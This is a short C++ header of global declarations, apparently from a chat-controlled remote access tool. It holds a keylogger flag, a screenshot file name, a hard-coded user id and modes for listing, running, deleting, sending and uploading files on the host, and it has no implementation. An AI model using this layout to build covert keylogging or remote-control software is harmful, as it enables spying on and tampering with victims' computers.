#ifndef GLOBALS_H
#define GLOBALS_H

#include <iostream>

extern const char* scrname;
extern const char* filename;
extern const char* cdfilename;
extern bool isKeyLoggerRunning;
extern bool isConversationRunning;
extern const int64_t sashaId;

enum Modes {
	MODE_STANDARD,
	MODE_CHECK_DIR,
	MODE_FULL_CHECK_DIR,
	MODE_START_FILE,
	MODE_DELETE_FILE,
	MODE_COPY_FILE,
	MODE_SEND_FILE,
	MODE_UPLOAD_FILE,
	MODE_CONVERSATION,
	MODE_PLAY_MUSIC,
};

extern int currentMode;
extern bool isWaitingForSecondPath;
extern bool isWaitingForFile;
extern bool isMusicPlaying;

#endif